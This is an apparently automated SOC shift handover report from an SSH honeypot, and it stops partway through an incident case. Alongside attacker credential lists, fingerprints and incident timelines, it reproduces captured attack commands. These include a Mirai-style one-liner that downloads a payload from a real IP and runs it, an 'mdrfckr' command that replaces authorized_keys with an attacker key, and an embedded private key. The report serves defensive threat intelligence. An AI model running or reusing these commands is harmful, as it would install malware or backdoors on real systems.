# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-25 |
| **Generated At** | 2026-08-25T20:34:34Z |
| **Shift Time** | 20:34 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **136** |
| Confirmed Threats | **111** |
| False Positives Filtered | **25** (18.4%) |
| Unique Attacker IPs | **46** |
| Countries of Origin | **24** |
| High Severity Cases | **50** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **86** |
| Malware Samples Analyzed | **2** HIGH · **20** MED · 22 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **57** |
| Unique Credential Pairs | **42** |
| Unique Usernames | **6** |
| Unique Passwords | **39** |
| Successful Auth Pairs | **49** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 29 |
| `ubuntu` | 12 |
| `admin` | 5 |
| `345gs5662d34` | 5 |
| `support` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 5 |
| `3245gs5662d34` | 5 |
| `admin` | 5 |
| `support` | 4 |
| `` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 5 |
| `support` | `support` | 4 |
| `root` | `` | 4 |
| `root` | `3245gs5662d34` | 3 |
| `admin` | `admin` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `124578` | `103.183.62.3` | 2026-08-25T16:57:30 |
| `345gs5662d34` | `345gs5662d34` | `103.183.62.3` | 2026-08-25T16:57:35 |
| `admin` | `3245gs5662d34` | `103.183.62.0` | 2026-08-25T16:57:37 |
| `root` | `Cp123456` | `72.17.34.38` | 2026-08-25T17:00:10 |
| `345gs5662d34` | `345gs5662d34` | `72.17.34.38` | 2026-08-25T17:00:11 |
| `root` | `3245gs5662d34` | `72.17.34.38` | 2026-08-25T17:00:11 |
| `deploy` | `123qweQWE` | `5.188.16.97` | 2026-08-25T17:00:57 |
| `345gs5662d34` | `345gs5662d34` | `5.188.16.97` | 2026-08-25T17:01:00 |
| `deploy` | `3245gs5662d34` | `5.188.16.97` | 2026-08-25T17:01:00 |
| `admin` | `admin` | `200.255.205.162` | 2026-08-25T17:02:19 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-25T17:02:21 |
| `ubuntu` | `virus@123` | `217.60.255.130` | 2026-08-25T17:04:06 |
| `root` | `Admin@786` | `217.60.255.130` | 2026-08-25T17:04:10 |
| `ubuntu` | `iran123` | `217.60.255.130` | 2026-08-25T17:13:49 |
| `root` | `ubuntu123#` | `217.60.255.130` | 2026-08-25T17:13:52 |
| `support` | `support` | `176.53.159.196` | 2026-08-25T17:14:58 |
| `root` | `Asdf1234.` | `118.145.238.115` | 2026-08-25T17:14:59 |
| `root` | `rootP@ssw0rd` | `210.79.142.201` | 2026-08-25T17:17:17 |
| `345gs5662d34` | `345gs5662d34` | `210.79.142.201` | 2026-08-25T17:17:21 |
| `root` | `3245gs5662d34` | `210.79.142.201` | 2026-08-25T17:17:23 |
| `ubuntu` | `admin@321` | `217.60.255.130` | 2026-08-25T17:24:19 |
| `root` | `developer@2024` | `217.60.255.130` | 2026-08-25T17:24:23 |
| `ubuntu` | `Password12345` | `217.60.255.130` | 2026-08-25T17:34:04 |
| `root` | `Micro@2025` | `217.60.255.130` | 2026-08-25T17:34:07 |
| `root` | `1234` | `207.46.224.87` | 2026-08-25T17:37:03 |
| `support` | `support` | `10.0.0.73` | 2026-08-25T17:39:46 |
| `ubuntu` | `a1234567@` | `217.60.255.130` | 2026-08-25T17:44:00 |
| `root` | `Test!123` | `217.60.255.130` | 2026-08-25T17:44:02 |
| `ubuntu` | `q123` | `217.60.255.130` | 2026-08-25T17:53:25 |
| `root` | `ASDF@1234` | `217.60.255.130` | 2026-08-25T17:53:31 |
| `ubuntu` | `qwer@1234` | `217.60.255.130` | 2026-08-25T18:03:11 |
| `root` | `Pass@123` | `217.60.255.130` | 2026-08-25T18:03:14 |
| `ubuntu` | `@Admin` | `217.60.255.130` | 2026-08-25T18:12:44 |
| `root` | `admin123.` | `217.60.255.130` | 2026-08-25T18:12:49 |
| `root` | `admin` | `125.140.145.62` | 2026-08-25T18:16:44 |
| `ubuntu` | `qwe!@#` | `217.60.255.130` | 2026-08-25T18:22:08 |
| `root` | `Linux@123` | `217.60.255.130` | 2026-08-25T18:22:13 |
| `ubuntu` | `P@ssw0rd123` | `217.60.255.130` | 2026-08-25T18:31:38 |
| `root` | `centos#2024` | `217.60.255.130` | 2026-08-25T18:31:42 |
| `root` | `admin` | `45.198.224.26` | 2026-08-25T18:32:13 |
| `root` | `0okm)OKM` | `103.183.62.1` | 2026-08-25T18:37:15 |
| `root` | `3245gs5662d34` | `103.183.62.3` | 2026-08-25T18:37:23 |
| `ubuntu` | `asdASD123` | `217.60.255.130` | 2026-08-25T18:41:15 |
| `root` | `India@1234` | `217.60.255.130` | 2026-08-25T18:41:18 |
| `ubuntu` | `qazwsxedc` | `217.60.255.130` | 2026-08-25T18:50:40 |
| `root` | `test123` | `217.60.255.130` | 2026-08-25T18:50:44 |
| `admin` | `admin` | `8.211.183.26` | 2026-08-25T18:51:58 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-25T18:53:08 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-25T18:53:08 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **136** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 49 |
| Go SSH scanner | 9 |
| Paramiko (Python) | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `419da4c91ddb...` | Modern SSH client | 24 | 1 |
| `f555226df196...` | Mirai/variant | 14 | 6 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |
| `16443846184e...` | Generic scanner | 2 | 2 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `419da4c91ddb...` | libssh | 24 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 14 | 6 | Mirai/variant |
| `95420f9d932d...` | libssh | 6 | 2 | — |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
```
```
cd /tmp
```
```
wget http://5.182.210.174/ok
```
```
curl -O http://5.182.210.174/ok
```
```
chmod +x ok
```
Source IPs: `45.198.224.26`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `118.145.238.115`, `103.183.62.1`, `72.17.34.38`, `103.183.62.3`, `5.188.16.97`, `210.79.142.201`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **46** |
| Unique ASNs | **37** |
| High-Risk ASNs | **27** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 6 | HIGH |
| `AS149636` | Hasan Broadband Net | 3 | HIGH |
| `AS8814` | Aztelekom LLC | 2 | LOW |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS31898` | Oracle Corporation | 1 | HIGH |
| `AS12400` | Partner Communications Ltd. | 1 | LOW |
| `AS12389` | PJSC Rostelecom | 1 | MEDIUM |
| `AS680` | Verein zur Foerderung eines Deutschen Forschungsnetzes e.V. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (50)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-e76440e85c5f

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]3` |
| **First Seen** | 2026-08-25 16:57 |
| **Last Seen** | 2026-08-25 16:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:57:29` | `cowrie.session.connect` |
| `2026-08-25 16:57:29` | `cowrie.client.version` |
| `2026-08-25 16:57:29` | `cowrie.client.kex` |
| `2026-08-25 16:57:30` | `cowrie.login.success` |
| `2026-08-25 16:57:31` | `cowrie.session.params` |
| `2026-08-25 16:57:31` | `cowrie.command.input` |
| `2026-08-25 16:57:31` | `cowrie.command.failed` |
| `2026-08-25 16:57:32` | `cowrie.log.closed` |
| `2026-08-25 16:57:33` | `cowrie.session.params` |
| `2026-08-25 16:57:33` | `cowrie.command.input` |
| `2026-08-25 16:57:33` | `cowrie.session.file_download` |
| `2026-08-25 16:57:33` | `cowrie.log.closed` |
| `2026-08-25 16:57:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]3` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9e0d3110633

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]3` |
| **First Seen** | 2026-08-25 16:57 |
| **Last Seen** | 2026-08-25 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:57:33` | `cowrie.session.connect` |
| `2026-08-25 16:57:33` | `cowrie.client.version` |
| `2026-08-25 16:57:34` | `cowrie.client.kex` |
| `2026-08-25 16:57:35` | `cowrie.login.success` |
| `2026-08-25 16:57:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]3` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed2f26ece7a2

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]0` |
| **First Seen** | 2026-08-25 16:57 |
| **Last Seen** | 2026-08-25 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 16:57:35` | `cowrie.session.connect` |
| `2026-08-25 16:57:35` | `cowrie.client.version` |
| `2026-08-25 16:57:36` | `cowrie.client.kex` |
| `2026-08-25 16:57:37` | `cowrie.login.success` |
| `2026-08-25 16:57:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]0` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]0` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52673ae6c45a

| Field | Detail |
|---|---|
| **Source IP** | `72.17.34[.]38` |
| **First Seen** | 2026-08-25 17:00 |
| **Last Seen** | 2026-08-25 17:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:00:09` | `cowrie.session.connect` |
| `2026-08-25 17:00:09` | `cowrie.client.version` |
| `2026-08-25 17:00:09` | `cowrie.client.kex` |
| `2026-08-25 17:00:10` | `cowrie.login.success` |
| `2026-08-25 17:00:10` | `cowrie.session.params` |
| `2026-08-25 17:00:10` | `cowrie.command.input` |
| `2026-08-25 17:00:10` | `cowrie.command.failed` |
| `2026-08-25 17:00:10` | `cowrie.log.closed` |
| `2026-08-25 17:00:11` | `cowrie.session.params` |
| `2026-08-25 17:00:11` | `cowrie.command.input` |
| `2026-08-25 17:00:11` | `cowrie.session.file_download` |
| `2026-08-25 17:00:11` | `cowrie.log.closed` |
| `2026-08-25 17:00:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.17.34[.]38` to AbuseIPDB if not already reported
- [ ] Block `72.17.34[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d90c9409caf2

| Field | Detail |
|---|---|
| **Source IP** | `72.17.34[.]38` |
| **First Seen** | 2026-08-25 17:00 |
| **Last Seen** | 2026-08-25 17:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:00:11` | `cowrie.session.connect` |
| `2026-08-25 17:00:11` | `cowrie.client.version` |
| `2026-08-25 17:00:11` | `cowrie.client.kex` |
| `2026-08-25 17:00:11` | `cowrie.login.success` |
| `2026-08-25 17:00:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.17.34[.]38` to AbuseIPDB if not already reported
- [ ] Block `72.17.34[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc9e2197c896

| Field | Detail |
|---|---|
| **Source IP** | `72.17.34[.]38` |
| **First Seen** | 2026-08-25 17:00 |
| **Last Seen** | 2026-08-25 17:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:00:11` | `cowrie.session.connect` |
| `2026-08-25 17:00:11` | `cowrie.client.version` |
| `2026-08-25 17:00:11` | `cowrie.client.kex` |
| `2026-08-25 17:00:11` | `cowrie.login.success` |
| `2026-08-25 17:00:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.17.34[.]38` to AbuseIPDB if not already reported
- [ ] Block `72.17.34[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df4948e5171e

| Field | Detail |
|---|---|
| **Source IP** | `5.188.16[.]97` |
| **First Seen** | 2026-08-25 17:00 |
| **Last Seen** | 2026-08-25 17:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:00:56` | `cowrie.session.connect` |
| `2026-08-25 17:00:56` | `cowrie.client.version` |
| `2026-08-25 17:00:56` | `cowrie.client.kex` |
| `2026-08-25 17:00:57` | `cowrie.login.success` |
| `2026-08-25 17:00:58` | `cowrie.session.params` |
| `2026-08-25 17:00:58` | `cowrie.command.input` |
| `2026-08-25 17:00:58` | `cowrie.command.failed` |
| `2026-08-25 17:00:58` | `cowrie.log.closed` |
| `2026-08-25 17:00:59` | `cowrie.session.params` |
| `2026-08-25 17:00:59` | `cowrie.command.input` |
| `2026-08-25 17:00:59` | `cowrie.session.file_download` |
| `2026-08-25 17:00:59` | `cowrie.log.closed` |
| `2026-08-25 17:01:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.188.16[.]97` to AbuseIPDB if not already reported
- [ ] Block `5.188.16[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37311c550985

| Field | Detail |
|---|---|
| **Source IP** | `5.188.16[.]97` |
| **First Seen** | 2026-08-25 17:00 |
| **Last Seen** | 2026-08-25 17:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:00:59` | `cowrie.session.connect` |
| `2026-08-25 17:00:59` | `cowrie.client.version` |
| `2026-08-25 17:00:59` | `cowrie.client.kex` |
| `2026-08-25 17:01:00` | `cowrie.login.success` |
| `2026-08-25 17:01:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.188.16[.]97` to AbuseIPDB if not already reported
- [ ] Block `5.188.16[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84a389f503e7

| Field | Detail |
|---|---|
| **Source IP** | `5.188.16[.]97` |
| **First Seen** | 2026-08-25 17:01 |
| **Last Seen** | 2026-08-25 17:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:01:00` | `cowrie.session.connect` |
| `2026-08-25 17:01:00` | `cowrie.client.version` |
| `2026-08-25 17:01:00` | `cowrie.client.kex` |
| `2026-08-25 17:01:00` | `cowrie.login.success` |
| `2026-08-25 17:01:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.188.16[.]97` to AbuseIPDB if not already reported
- [ ] Block `5.188.16[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f908466a55d2

| Field | Detail |
|---|---|
| **Source IP** | `200.255.205[.]162` |
| **First Seen** | 2026-08-25 17:02 |
| **Last Seen** | 2026-08-25 17:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:02:15` | `cowrie.session.connect` |
| `2026-08-25 17:02:16` | `cowrie.client.version` |
| `2026-08-25 17:02:17` | `cowrie.client.kex` |
| `2026-08-25 17:02:19` | `cowrie.login.success` |
| `2026-08-25 17:02:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.255.205[.]162` to AbuseIPDB if not already reported
- [ ] Block `200.255.205[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1f341fc8cf9

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-25 17:02 |
| **Last Seen** | 2026-08-25 17:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:02:20` | `cowrie.session.connect` |
| `2026-08-25 17:02:20` | `cowrie.client.version` |
| `2026-08-25 17:02:21` | `cowrie.client.kex` |
| `2026-08-25 17:02:21` | `cowrie.login.success` |
| `2026-08-25 17:02:22` | `cowrie.session.params` |
| `2026-08-25 17:02:22` | `cowrie.command.input` |
| `2026-08-25 17:02:23` | `cowrie.session.file_download` |
| `2026-08-25 17:02:23` | `cowrie.session.file_download` |
| `2026-08-25 17:02:23` | `cowrie.log.closed` |
| `2026-08-25 17:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1db1004146c0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 17:04 |
| **Last Seen** | 2026-08-25 17:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:04:05` | `cowrie.session.connect` |
| `2026-08-25 17:04:05` | `cowrie.client.version` |
| `2026-08-25 17:04:05` | `cowrie.client.kex` |
| `2026-08-25 17:04:06` | `cowrie.login.success` |
| `2026-08-25 17:04:06` | `cowrie.direct-tcpip.request` |
| `2026-08-25 17:04:06` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 17:04:06` | `cowrie.direct-tcpip.data` |
| `2026-08-25 17:04:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80ec2f1c6e47

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 17:04 |
| **Last Seen** | 2026-08-25 17:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:04:09` | `cowrie.session.connect` |
| `2026-08-25 17:04:09` | `cowrie.client.version` |
| `2026-08-25 17:04:09` | `cowrie.client.kex` |
| `2026-08-25 17:04:10` | `cowrie.login.success` |
| `2026-08-25 17:04:10` | `cowrie.direct-tcpip.request` |
| `2026-08-25 17:04:10` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 17:04:10` | `cowrie.direct-tcpip.data` |
| `2026-08-25 17:04:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dff8d89e270

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 17:13 |
| **Last Seen** | 2026-08-25 17:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 17:13:46` | `cowrie.session.connect` |
